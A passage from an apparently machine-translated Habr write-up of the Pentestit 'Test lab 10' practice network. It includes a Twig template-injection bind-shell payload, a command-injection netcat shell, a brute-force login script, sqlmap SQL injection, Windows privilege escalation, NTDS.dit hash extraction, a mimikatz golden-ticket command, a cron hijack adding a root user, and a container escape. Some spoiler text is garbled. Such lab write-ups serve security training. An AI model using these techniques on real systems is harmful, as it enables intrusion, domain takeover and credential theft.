src="https://habrastorage.org/files/f94/0af/8ab/f940af8ab0344793b0f704e1cd4adbce.png" width="100%"><br><br>  The attack itself can be studied in detail at the link above, and we will try to make payload in order to create a bind shell.  First, let's clarify the username: <br><br><img src="https://habrastorage.org/files/8bc/4f1/9fc/8bc4f19fcc07430a8fa0f841896512f5.png" width="100%"><br><br><pre> <code class="bash hljs">       <span class="hljs-built_in"><span class="hljs-built_in">bind</span></span> shell: http://192.168.0.8/dev/index.php?hname={{_self.env.registerUndefinedFilterCallback(<span class="hljs-string"><span class="hljs-string">"exec"</span></span>)}}{{_self.env.getFilter(<span class="hljs-string"><span class="hljs-string">"nc -nvlp 1234 -e /bin/sh"</span></span>)}}</code> </pre><br>  Having connected, we find another token! <br><br><img src="https://habrastorage.org/files/078/4af/866/0784af866f4c458eb8de077f40dec41d.png" width="100%"><br><br><h1>  We read <code>news</code> </h1><br>  news (192.168.0.5) is another site in Global Data Security that looks like a hall of fame, with the ability to register, log in, recover a password and study internal news. <br><br>  Login form invites us to enter email and password. <br><img src="https://habrastorage.org/files/b95/050/f4f/b95050f4f2764976889660dafe2d5cc6.png" width="100%"><br><br>  Having tried all known combinations of login and password of already found users (a.modlin, e.lindsey, etc.), we understand that they are not registered - we receive the message wrong e-mail.  In this case, an attempt to enter admin@gds.lab leads to another message: wrong password.  This means the user admin@gds.lab is registered. <br><br>  Armed with Burp Suite, we try to find the password for admin@gds.lab, but this does not lead to success.  Then again we turn to dirsearch and look for what else is hidden on the news site: <br><br><img src="https://habrastorage.org/files/c4c/fd2/921/c4cfd29217aa4c1b89a59feca9d07679.png" width="100%"><br><br>  We find the folder / old, and in it the old version of the news site, in which there is an interesting comment that hints at the existence of a ‚Äúsimple user‚Äù, that is, user: <br><br><img src="https://habrastorage.org/files/81b/546/eef/81b546eefd6545cf83e4a92d7e2d41fc.png" width="100%"><br><br>  Check our guesses.  Login to / old does not lead to anything interesting, but if you go under user@gds.lab with the user password to the new news site, we see the following page: <br><br><img src="https://habrastorage.org/files/47e/5d6/1c1/47e5d61c13fa439db1d6cb7cfea081e5.png" width="100%"><br><br>  Great, it remains to log in as administrator.  We have just learned about the existence of a new page - user_info.php, let's see what is on this account in / old. <br><br><img src="https://habrastorage.org/files/a7d/278/0f0/a7d2780f08a042848ede2234c28bd479.png" width="100%"><br><br>  After several attempts, we understand that if you try to log in as user admin using this address, you will not be able to log in, but the output of user_info.php will change: <br><br><pre> <code class="bash hljs">http://192.168.0.5/old/login_2.php?username=admin&amp;password=admin</code> </pre><br><img src="https://habrastorage.org/files/5a2/aa1/dd0/5a2aa1dd05ac4c0ca61d3427995d83d8.png" width="100%"><br><br>  That is, in fact, we entered!  However, the new user_info.php now still does not allow us to get inside. <br><br>  From this we can conclude that the two sites use the same session, and store information about the user in it.  Apparently, an attempt to log into / old saves the username in the username field in the session, and simply does not redirect to user_info.php if the password is incorrect (instead of saving the user name only after successfully logging in with the correct password).  And although this is enough for the / old site, the new one still uses email, so it‚Äôs impossible to enter user_info.php. <br><br>  Let's try to reset the password for the admin user: <br><br><pre> <code class="bash hljs">http://192.168.0.5/password_restore_2.php?email=admin@gds.lab</code> </pre><br>  Hoping that in the form of a password reset, the programmer made the same mistake (namely, saved an email in the session), we try to save the correct email in the session in order to log in as an administrator. <br><br>  Total, the whole process consists of the following steps: <br><ul><li>  <code>http://192.168.0.5/login_2.php?email=user%40gds.lab&amp;password=user</code> - enter user@gds.lab/user into the new site </li><li>  <code>http://192.168.0.5/old/login_2.php?username=admin&amp;password=user</code> - set the value of ‚Äúadmin‚Äù as the current user </li><li>  <code>http://192.168.0.5/password_restore_2.php?email=admin@gds.lab</code> - set the value of ‚Äúadmin@gds.lab‚Äù as the current email address </li><li>  <code>http://192.168.0.5/user_info.php</code> - we logged in as administrator </li></ul><br>  After a successful login, we get a token (cut out in the screenshot below): <br><br><img src="https://habrastorage.org/files/b43/2b4/efa/b432b4efa8ff42da998217f9c5561756.png" width="100%"><br><br>  And now, the news succumbed! <br><br><h1>  We get <code>web-control</code> </h1><br>  We begin, as usual, with port scanning, for which we use nmap, conveniently provided to us on the SSH host. <br><img src="https://habrastorage.org/files/46b/458/725/46b4587259cf42b5ae06a60d33aad3f3.png" width="100%"><br><br>  Having studied the 80th port, we find nothing interesting except the form for collecting emails, which, moreover, does not work, and the folder / uploads, in which nothing interesting could be found. <br><br>  Let's pay attention to the non-standard port 1503. To study it, we will try to connect: <br><br><pre> <code class="bash hljs">nc 192.168.0.6 1503</code> </pre><br><img src="https://habrastorage.org/files/045/7af/6b7/0457af6b7abb457b9cf89e14eb068c3e.png" width="100%"><br><br>  Apparently, you need to choose a combination of login and password.  Having tried the passwords known to us with ssh, hall-of-fame and mail we understand that everything is not so simple, and we will have to write a small script: <br><br><pre> <code class="python hljs"><span class="hljs-string"><span class="hljs-string">"""Sockets"""</span></span> <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> socket WEB_CONTROL_HOST = <span class="hljs-string"><span class="hljs-string">'192.168.0.6'</span></span> WEB_CONTROL_PORT = <span class="hljs-number"><span class="hljs-number">1503</span></span> USER_FILE = <span class="hljs-string"><span class="hljs-string">'/root/pentestit/webc/users.txt'</span></span> PASS_FILE = <span class="hljs-string"><span class="hljs-string">'/opt/SecLists/Passwords/john.txt'</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">recv_until</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(string, sock)</span></span></span><span class="hljs-function">:</span></span> <span class="hljs-string"><span class="hljs-string">"""Receives data from socket until certain string is found"""</span></span> data = <span class="hljs-string"><span class="hljs-string">""</span></span> <span class="hljs-keyword"><span class="hljs-keyword">while</span></span> <span class="hljs-keyword"><span class="hljs-keyword">True</span></span>: tmp = sock.recv(<span class="hljs-number"><span class="hljs-number">1</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> tmp == <span class="hljs-string"><span class="hljs-string">""</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">break</span></span> data += tmp <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> data.endswith(string): <span class="hljs-keyword"><span class="hljs-keyword">break</span></span> <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> data <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">attempt_login</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(user, password)</span></span></span><span class="hljs-function">:</span></span> <span class="hljs-string"><span class="hljs-string">"""Attempts to log in under a specified account"""</span></span> <span class="hljs-comment"><span class="hljs-comment"># This should not connect every time and should be multi-threaded in an ideal world web_control = socket.socket(socket.AF_INET, socket.SOCK_STREAM) web_control.connect((WEB_CONTROL_HOST, WEB_CONTROL_PORT)) reply = recv_until("Enter login: ", web_control) web_control.send(user) reply = recv_until("Enter password: ", web_control) web_control.send(password) reply = web_control.recv(6) web_control.close() return "Error!" not in reply with open(USER_FILE) as user_file: for user_line in user_file: with open(PASS_FILE) as pass_file: for pass_line in pass_file: if attempt_login(user_line, pass_line): print "Success: " + user_line.rstrip('\n') + ":" + pass_line.rstrip('\n')</span></span></code> </pre><br>  As users, we write out accounts known to us from ssh, and several standard names: <br><br><pre> <code class="bash hljs">admin administrator root user k.barth m.howard g.leone j.wise s.locklear e.lindsey a.modlin</code> </pre><br>  Run the script for execution, and after a while we get the desired result: <br><br><img src="https://habrastorage.org/files/996/41a/29f/99641a29f6eb4741b11a7f3e7d732efc.png" width="100%"><br><br>  Happened!  After with the necessary login and password, we understand that we found ourselves in a samopisny tool to run some scripts. <br><br>  A lot of vulnerabilities associated with poorly verified user input, try to achieve command injection.  If the input is passed to the system, we can add an additional command using the separator -;, &amp;, or |.  Let's try! <br><br><img src="https://habrastorage.org/files/e22/9a2/ff8/e229a2ff8faf4bc688a895e4bea9a601.png" width="100%"><br><br>  Everything is filtered except |, which apparently was missed by the developers.  Using the command <code>| nc -nvlp 1234 -e /bin/sh</code>  <code>| nc -nvlp 1234 -e /bin/sh</code> create a bind shell on the web control.  Now it remains only to connect and find the token: <br><br><pre> <code class="bash hljs">nc 192.168.0.6 1234 cat /var/opt/token.txt</code> </pre><br><h1>  Token <code>store</code> </h1><br>  As can be seen from the network diagram, the store is represented by two hosts - 172.16.0.4 (production), and 172.16.0.5 (dev).  In addition, a copy of the store is located on the ssh host in the / var / www / folder. <br><br>  After examining the contents of / var / www we draw the following conclusions: <br><ul><li>  the latest version of OpenCart is used, in which there are no known vulnerabilities </li><li>  in <code>/var/www/config.php</code> we find the password to the local database, on which the store copy is installed;  in it we find the admin user password hash - until it is our only hope. </li></ul><br>  In hashcat recently even had the opportunity to pick up hashes of the OpenCart format.  Let's try: <br><img src="https://habrastorage.org/files/233/e68/d29/233e68d29a3e4912a1fac8646ff10b69.png" width="100%"><br>  Unfortunately, it is not possible to pick up a password even on a large enough dictionary. <br><br>  Let's switch attention to store and dev-store - maybe there is an additional hidden file in them, or an old, vulnerable version of OpenCart is used.  After some time, we find the SQL injection on the dev-store machine, which was not on ssh or store - apparently, an old version with a <a href="https://www.exploit-db.com/exploits/17807/">vulnerability</a> remained on this server. <br><br>  To check, we change the hosts file by adding an entry: <br><br><pre> <code class="bash hljs">172.16.0.5 store.gds.lab</code> </pre><br>  And run SQLmap: <br><pre> <code class="bash hljs">sqlmap -u <span class="hljs-string"><span class="hljs-string">'http://store.gds.lab/index.php?route=product/product&amp;product_id=53*'</span></span> --sql-shell</code> </pre><br><img src="https://habrastorage.org/files/d9d/918/f1e/d9d918f1e7744229917c25f264dfbb5b.png" width="100%"><br><br>  We got access to the database on the dev-store.  Unfortunately, access to the file system is limited (read / etc / passwd or write something to the file via OUTFILE does not work), so, apparently, the token is right in the database. <br><br><img src="https://habrastorage.org/files/72d/5b5/184/72d5b51840ef413c89a31bb076c58bb2.png" width="100%"><br><br>  And so, the store is taken! <br><br><h1>  We study <code>win-term</code> </h1><br>  It took the participants more than four days to advance further, although, as usual, the casket just opened.  Currently, three tokens remain undisclosed - <code>win-term, win-dc0</code> and <code>cloud</code> . <br><br>  Having scanned the ports on the Windows terminal and the domain controller (DC0), we understand that no additional services are open, the Windows version is 2008 R2, and there are no known public vulnerabilities allowing for code execution.  Despite this, we can determine that the updates have not been installed for a long time, because you can restart win-term using a <a href="https://www.exploit-db.com/exploits/18606/">vulnerability in RDP</a> .  This means that it is probably not so difficult to elevate privileges to the administrator after logging in to the machine. <br><br>  Searching passwords in the dictionary also does not give the desired result on any of the accounts.<font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Just in case, make sure that the previously found credentials exist in the domain: </font></font><br><br><img src="https://habrastorage.org/files/588/2d6/02e/5882d602ec2b4933a29d0bcf3ef9e0aa.png" width="100%"><br><br>  Everything is in place.<font style="vertical-align: inherit;"><font style="vertical-align: inherit;">At this stage, we have the passwords of two users - a.modlin and e.lindsey. </font><font style="vertical-align: inherit;">Let's try to modify the password e.lindsey so that it corresponds to the standard domain policies, and contains large and small letters and numbers. </font><font style="vertical-align: inherit;">To begin with, let‚Äôs make the first letter of the e.lindsey password capitalized:</font></font><br><br><pre> <code class="bash hljs">rdesktop 192.168.0.3 -u <span class="hljs-string"><span class="hljs-string">"GDS-OFFICE\\e.lindsey"</span></span> -p <span class="hljs-string"><span class="hljs-string">"**********"</span></span> -r disk:share=/root/pentestit/term -r clipboard:PRIMARYCLIPBOARD</code> </pre><br><img src="https://habrastorage.org/files/a20/7ce/d94/a207ced942034441917a5c3a64ad7a44.png" width="100%"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">I managed to connect! </font><font style="vertical-align: inherit;">Let's try to elevate privileges to the administrator using the known vulnerability </font></font><a href="https://www.exploit-db.com/exploits/39719/"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MS16-023</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font><font style="vertical-align: inherit;">I compiled this code as exe file, but you can also execute it via PowerShell.</font></font> Run: <br><br><img src="https://habrastorage.org/files/79e/cf2/efe/79ecf2efe5df43b997bf8c637bb4223c.png" width="100%"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> In the resulting administrator console, we create a separate user, delete the extra files, and go under the local administrator: </font></font><br><br><pre> <code class="bash hljs">rdesktop 192.168.0.3 -u <span class="hljs-string"><span class="hljs-string">"TermAdmin"</span></span> -p <span class="hljs-string"><span class="hljs-string">"Admin123"</span></span> -r disk:share=/root/pentestit/term -r clipboard:PRIMARYCLIPBOARD</code> </pre><br><img src="https://habrastorage.org/files/54e/964/7da/54e9647da680440f889298432768d362.png" width="100%"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> At the administrator, we find the script for connecting an encrypted disk using TrueCrypt with a key. </font></font> Run: <br><br><img src="https://habrastorage.org/files/e49/aeb/1d8/e49aeb1d832b429ea092bae579299b19.png" width="100%"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">On the disk X that appears, there is a KeePass base, again with a key: </font></font><br><br><img src="https://habrastorage.org/files/5f6/16d/9cc/5f616d9ccfdd4cdea9fc3ba84ece0f91.png" width="100%"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">And in it is the password from the rross account to the cloud, and the long-awaited token:</font></font><br><br><img src="https://habrastorage.org/files/7cb/1c8/283/7cb1c82838da483ba56b3b54a8416076.png" width="100%"><br><br><h1><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> We get domain administrator rights in </font></font><code>win-dc0</code> </h1><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Continuing to examine the contents of the terminal, we find the folder with the backup of the domain controller disk: We will </font></font><br><br><img src="https://habrastorage.org/files/41a/d50/88e/41ad5088e5c74417ad5b0aca1c74aa76.png" width="100%"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">connect the VHD file to the server management console: </font></font><br><br><img src="https://habrastorage.org/files/b63/c60/3db/b63c603db0094731952702c1f497cd51.png" width="100%"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Then copy the file </font></font><code>Windows\NTDS\Ntds.dit</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">and </font></font><code>Windows\System32\config\SYSTEM</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">from the newly connected VHD to the local kali machine. </font></font><br><br><img src="https://habrastorage.org/files/af7/817/74b/af781774b3544f95bd4142e6e1ef08e2.png" width="100%"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Before proceeding, you need to prepare by installing special utilities for working with NTDS.dit tables: </font></font><a href="https://github.com/libyal/libesedb"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">libesedb</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> and </font></font><a href="https://github.com/csababarta/ntdsxtract"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NTDSXtract</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font><font style="vertical-align: inherit;">You can install them in / opt this way:</font></font><br><br><pre> <code class="bash hljs"><span class="hljs-built_in"><span class="hljs-built_in">cd</span></span> /opt git <span class="hljs-built_in"><span class="hljs-built_in">clone</span></span> https://github.com/libyal/libesedb.git <span class="hljs-built_in"><span class="hljs-built_in">cd</span></span> libese/ apt-get install git autoconf automake autopoint libtool pkg-config build-essential ./synclibs.sh ./autogen.sh ./configure make make install <span class="hljs-built_in"><span class="hljs-built_in">cd</span></span> .. git <span class="hljs-built_in"><span class="hljs-built_in">clone</span></span> https://github.com/csababarta/ntdsxtract.git</code> </pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Now everything is ready. First of all, extract the tables from ntds.dit using </font></font><code>esedbexport</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">: </font></font><br><br><img src="https://habrastorage.org/files/d86/c77/24e/d86c7724efdd421d8a6bb2fc970a2c4d.png" width="100%"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">In the ntds.dit.export directory that appears, use NTDSXtract to extract the hashes: </font></font><br><br><img src="https://habrastorage.org/files/cce/608/450/cce60845077e4839960eaf5f1b7eca14.png" width="100%"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">As a result of executing this command, we will get the nt.john.out file with the extracted hashes in the new dump / folder: </font></font><br><br><img src="https://habrastorage.org/files/5fb/8e2/a1b/5fb8e2a1be4e49f4b8ef7b5dea7b1008.png" width="100%"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Sometimes You can stop at this if you can recover the password from the extracted administrator hash. In this case, since this is a backup copy, the password is no longer suitable. Therefore, we use the Pass the Ticket (ptt) attack, in which we use the hash of the krbtgt account to generate the so-called golden ticket. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">To do this, </font></font><a href="https://github.com/gentilkiwi/mimikatz"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">download mimikatz</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> to the terminal, and run it with administrator rights:</font></font><br><br><img src="https://habrastorage.org/files/5c5/95f/b02/5c595fb02df745339254157bffcae9cb.png" width="100%"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">To create a golden ticket, we need the domain SID (obtained using the command </font></font><code>lsadump::lsa</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">in the screenshot above), the domain administrator account name (obtained from NTDS.dit), the krbtgt account hash (also obtained above) and the names of the groups that the administrator belongs to (standard values: 500, 501, 513, 512, 520, 518, 519). </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Using this information, create a golden ticket and apply it:</font></font><br><br><pre> <code class="bash hljs">kerberos::golden /domain:gds-office.lab /sid:S-1-5-21-421115581-889488229-2938181853 /rc4:1dc9bae0282962e7d761a2eda274e6d7 /id:500 /user:administrator /groups:500,501,513,512,520,518,519 /ptt</code> </pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Then we run a separate cmd.exe with the applied ticket, and get access to the C $ resource on the domain controller: </font></font><br><br><img src="https://habrastorage.org/files/39f/771/288/39f77128806449db8bcc4c0acea05d71.png" width="100%"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">That's the token! </font><font style="vertical-align: inherit;">At the moment we have full domain administrator rights on this disk, and accordingly we can execute arbitrary code on the domain controller, which usually marks the successful final of any pentest. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">In this case, the attack was greatly simplified - there was a backup copy of the domain controller's disks, there was no active attack detection, including the same mimikatz, and the necessary patches were also missing.</font></font><br><br><h1><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> The Last Frontier - </font></font><code>cloud</code> </h1><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">We start as usual with port scanning: </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Having found the SSH service on port 2222, we try to go there with the rross account and the password found on the terminal.</font></font><br><br><div class="spoiler">  <b class="spoiler_title">Note</b> <div class="spoiler_text">       ,        ownCloud     (    ), -   ,     sqlite   ownCloud (http://cloud.gds.lab/data/owncloud.db),          (          ).  , SSH-  rross    ,     /data/users/   SSH, ,  ,  .     2222    ,          rross    user enumeration timing attack.      <a href="https://github.com/c0r3dump3d/osueta">osueta</a> . <br><br>      40          ‚Äî   ,  OpenSSH   ,     ‚Äî        .    OpenSSH   ,         ,        . <br></div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">In any case, after successfully obtaining a token </font></font><code>win-term</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">, we have a password with which you can log in to SSH. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Interestingly, every time we get to the server, we get into a different lxc container - from lxc1 to lxc5. </font></font><br><br><img src="https://habrastorage.org/files/f59/494/41d/f5949441dd044b828d8de7f8e299f5ba.png" width="100%"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">After studying, it becomes clear that you need to raise privileges, because with the privileges of the user rross nothing interesting is available. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">On lxc1, a classic error in managing rights was made: </font></font><br><br><img src="https://habrastorage.org/files/b4f/fab/7ca/b4ffab7ca1c8490b87b5068a51fa2ca6.png" width="100%"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">The script </font></font><code>clear_nginx_logs.sh</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">runs regularly with root rights, and it can be modified by any user. Create a new user in the system:</font></font><br><br><img src="https://habrastorage.org/files/23b/12a/62a/23b12a62ab4c4c789b640019ec98ecac.png" width="100%"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Here we add a new user in / etc / passwd with the name ff and password 123 (hashed in an obsolete format, for simplicity) with id equal to 0 (root). A minute later we go under this user and get full access to the container: The </font></font><br><br><img src="https://habrastorage.org/files/8cb/702/8db/8cb7028db133485686dfec642001ff13.png" width="100%"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">user is added, but there is still no token in the container - you need to go outside the container. Recently, the NCC Group published a </font></font><a href="https://www.nccgroup.trust/globalassets/our-research/us/whitepapers/2016/june/container_whitepaperpdf/"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">study</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> on this issue. The example on page 16 is an exploit that can be used to access the file system of the host machine. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Compile and run the file on the container: </font></font><br><br><img src="https://habrastorage.org/files/9fe/c04/182/9fec0418271a44458ca3d34cae3d3bf4.png" width="100%"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Finally, the final, the last token in the token.txt file on the host machine: </font></font><br><br><img src="https://habrastorage.org/files/071/8cc/708/0718cc7087624a9bba785a06a66301e9.png" width="100%"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">The last token is taken!</font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Pay attention to the file ntdsutil_snapshot.zip - by copying it to your local computer, you can get a backup copy of the files ntds.dit and SYSTEM in another way. We enable the local SSH service and make it available on the container:</font></font><br><br><pre> <code class="bash hljs">service ssh start</code> </pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Then we will do remote port forwarding via SSH: </font></font><br><br><img src="https://habrastorage.org/files/593/438/21b/59343821bed1416e9f65de35b632a0c1.png" width="100%"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">And copy the file via scp: </font></font><br><br><img src="https://habrastorage.org/files/b62/41b/2ef/b6241b2ef33741228f366c5bdbd675b7.png" width="100%"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Unpacking it, we‚Äôll get the same ntds.dit and SYSTEM for win-dc0: </font></font><br><br><img src="https://habrastorage.org/files/6be/341/a20/6be341a2015e4190bd046ca451de7fb7.png" width="100%"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Lab passed! </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">All material is presented here solely for educational purposes, so your comments on the passage of the laboratory are welcome - let as many people as possible learn about different ways of solving a particular task. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">I wish good luck to those who have not yet had time to go through the laboratory and experience the joy of taking each car on the network. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">I want to thank Pentestit for the excellent laboratory - it was interesting, and to thank the reader for reaching this point.</font></font><br><br>  Thank!<font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> We are waiting for the 11th laboratory in May 2017. </font></font></div><p>Source: <a href="https://habr.com/ru/post/317322/">https://habr.com/ru/post/317322/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../317306/index.html">Breaking the admin panel of the router</a></li>
<li><a href="../317312/index.html">The perfect programmer. Part 1</a></li>
<li><a href="../317314/index.html">Progress Tracking in R</a></li>
<li><a href="../317318/index.html">Creating a website as a product or "why is it so expensive?"</a></li>
<li><a href="../317320/index.html">The study of connectivity in the brain based on electrophysiological data. Lecture in Yandex</a></li>
<li><a href="../317326/index.html">Ruby code coverage analysis</a></li>
<li><a href="../317328/index.html">Performance comparison of GPU calculations in Python and C</a></li>
<li><a href="../317332/index.html">Communication strategy as a tool for building a career and personal brand</a></li>
<li><a href="../317334/index.html">The digest of interesting materials for the mobile # 183 developer (December 5-11)</a></li>
<li><a href="../317336/index.html">Scrapbook with M * CTF</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>